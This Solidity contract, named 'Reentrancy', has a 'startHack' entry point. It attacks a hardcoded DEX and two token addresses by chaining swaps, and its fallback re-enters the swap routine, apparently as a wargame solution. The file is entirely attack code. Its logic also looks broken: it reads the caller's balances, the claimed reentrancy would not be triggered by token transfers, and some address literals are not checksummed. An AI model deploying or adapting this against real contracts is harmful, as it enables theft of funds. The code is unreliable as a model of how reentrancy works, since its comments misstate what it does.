pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address) external view returns (uint);
    function approve(address, uint) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

contract Reentrancy {
    address immutable public DEX_TWO = 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be;
    address immutable public TOKEN1 = 0xb7a5bd0345ef1cc5e66bf61bdec17d2461fbd968;
    address immutable public TOKEN2 = 0xeebe00ac0756308ac4aabfd76c05c4f3088b8883;

    function startHack() external {
        // Initial approve for starting the first swap
        IERC20(TOKEN1).approve(DEX_TWO, 1000000000000000000);
        swapTokens();
    }

    function swapTokens() public {
        // First swap: sell 1% of token1 for token2
        uint256 token1Balance = IERC20(TOKEN1).balanceOf(msg.sender);
        uint256 amount = token1Balance / 100;
        if (amount > 0) {
            IERC20(TOKEN1).approve(DEX_TWO, amount);
            (bool success, ) = DEX_TWO.call(
                abi.encodeWithSignature("swap(address,address,uint256)", TOKEN1, TOKEN2, amount)
            );
            require(success, "swap1 failed");
            // Re-entrancy here, automatically triggered after receiving token2
            uint256 token2Balance = IERC20(TOKEN2).balanceOf(msg.sender);
            if (token2Balance > 0) {
                IERC20(TOKEN2).approve(DEX_TWO, token2Balance);
                (success, ) = DEX_TWO.call(
                    abi.encodeWithSignature("swap(address,address,uint256)", TOKEN2, TOKEN1, token2Balance)
                );
                require(success, "swap2 failed");
            }
        }
    }

    fallback() external payable {
        swapTokens();
    }
} 
